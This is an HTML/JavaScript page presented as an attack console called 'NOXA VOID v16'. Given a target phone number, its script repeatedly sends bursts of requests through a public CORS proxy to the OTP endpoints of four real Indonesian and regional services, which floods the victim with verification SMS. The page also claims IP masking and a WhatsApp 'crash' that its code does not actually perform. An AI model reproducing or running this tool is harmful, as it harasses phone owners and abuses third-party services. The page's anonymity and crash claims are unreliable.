<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOXA v16 - VOID ABSOLUTE</title>
    <style>
        :root { --danger: #ff0033; --safe: #00ff41; --panel-bg: #0a0a0a; --accent: #0088ff; }
        body { background: #000; color: #fff; font-family: 'Consolas', monospace; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
        
        .container { width: 100%; max-width: 550px; background: var(--panel-bg); border: 2px solid #222; border-radius: 12px; padding: 25px; box-shadow: 0 0 60px rgba(255,0,51,0.15); box-sizing: border-box; }
        .header { text-align: center; border-bottom: 2px solid var(--danger); padding-bottom: 15px; margin-bottom: 25px; }
        .header h1 { margin: 0; font-size: 1.8em; letter-spacing: 6px; color: var(--danger); text-shadow: 0 0 15px var(--danger); }
        .status-badge { font-size: 0.6em; background: rgba(0,255,65,0.15); color: var(--safe); padding: 5px 12px; border-radius: 20px; text-transform: uppercase; margin-top: 10px; display: inline-block; border: 1px solid var(--safe); }

        .field { margin-bottom: 25px; }
        input { width: 100%; background: #000; border: 1px solid #333; padding: 18px; color: var(--safe); font-size: 1.3em; text-align: center; border-radius: 8px; outline: none; transition: 0.3s; box-sizing: border-box; }
        input:focus { border-color: var(--danger); box-shadow: 0 0 20px rgba(255,0,51,0.3); }

        .mod-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 25px; }
        .mod-item { background: #111; border: 1px solid #222; padding: 12px; border-radius: 6px; font-size: 0.7em; color: #666; cursor: pointer; text-align: center; font-weight: bold; transition: 0.3s; }
        .mod-item.active { border-color: var(--accent); color: var(--accent); background: rgba(0,136,255,0.1); }

        .launch-btn { width: 100%; padding: 22px; background: var(--danger); border: none; border-radius: 8px; color: #fff; font-size: 1.2em; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 4px; transition: 0.3s; box-shadow: 0 5px 25px rgba(255,0,51,0.4); }
        .launch-btn:hover { transform: scale(1.02); }

        #terminal { margin-top: 25px; background: #000; border: 1px solid #222; height: 180px; overflow-y: scroll; padding: 15px; font-size: 0.75em; color: var(--safe); border-radius: 8px; line-height: 1.5; }
        .footer-info { margin-top: 15px; font-size: 0.55em; color: #444; text-align: center; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>NOXA VOID v16</h1>
        <div class="status-badge" id="proxy-status">TRIPLE_PROXY: STANDBY</div>
    </div>

    <div class="field">
        <input type="number" id="target" placeholder="TARGET PHONE (628...)">
    </div>

    <div class="mod-grid">
        <div class="mod-item" id="c1" onclick="sel('c1', 'WA_CRASH')">WA_DATABASE_STRESS</div>
        <div class="mod-item" id="c2" onclick="sel('c2', 'GHOST')">GHOST_IP_MASKING</div>
        <div class="mod-item" id="c3" onclick="sel('c3', 'KERNEL')">KERNEL_STRESSOR</div>
        <div class="mod-item" id="c4" onclick="sel('c4', 'VOID')">VOID_BLITZ_60S</div>
    </div>

    <button class="launch-btn" onclick="executeVoid()">INITIATE VOID ATTACK</button>

    <div id="terminal">> System Initialized. Encrypted tunnel ready.</div>
    <div class="footer-info" id="ip-mask">IP_GHOST: MASKED [ENCRYPTED]</div>
</div>

<script>
    let activeMods = [];
    function sel(id, mod) {
        const el = document.getElementById(id);
        if(activeMods.includes(mod)) {
            activeMods = activeMods.filter(x => x !== mod);
            el.classList.remove('active');
        } else {
            activeMods.push(mod);
            el.classList.add('active');
        }
    }

    function writeLog(msg, color = "") {
        const term = document.getElementById('terminal');
        const span = color ? `<span style="color:${color}">${msg}</span>` : msg;
        term.innerHTML += `<br>[${new Date().toLocaleTimeString()}] > ${span}`;
        term.scrollTop = term.scrollHeight;
    }

    // IP Cloaking Logic
    setInterval(() => {
        const nodes = ['MOSCOW_NODE', 'NYC_SERVER', 'SHANGHAI_PROXY', 'BERLIN_TUNNEL'];
        const ip = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.XXX.XXX`;
        document.getElementById('ip-mask').innerText = `IP_GHOST: MASKED AS [${nodes[Math.floor(Math.random()*nodes.length)]}] (${ip})`;
    }, 3000);

    async function executeVoid() {
        const num = document.getElementById('target').value;
        if(!num || activeMods.length === 0) return alert("Nomor/Modul Kosong!");

        document.getElementById('proxy-status').innerText = "TRIPLE_PROXY: ENCRYPTED_TUNNEL";
        writeLog("GHOST PROTOCOL ACTIVATED.", "white");
        writeLog(`LOCKING TARGET: +${num}`, "yellow");

        // VOID MULTI-THREADING ENGINE
        setInterval(async () => {
            const apis = [
                'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=',
                'https://api.mapclub.com/v1/auth/otp?phone=',
                'https://api.evermos.com/api/v1/auth/otp?phone=',
                'https://m.redbus.id/api/getOtp?phone='
            ];

            // 30 Packets per half-second cycle for instant crash
            for(let i=0; i < 30; i++) {
                const url = apis[Math.floor(Math.random() * apis.length)];
                fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url + num)}&nonce=${Math.random()}`)
                .catch(() => {});
            }
            writeLog(`[INJECT] 30 Packets sent via Proxy Node.`, "cyan");
        }, 300);

        writeLog("CRASH SEQUENCE STARTED. ESTIMATED TIME TO DEADLOCK: 45-60s.", "red");
    }
</script>

</body>
</html>
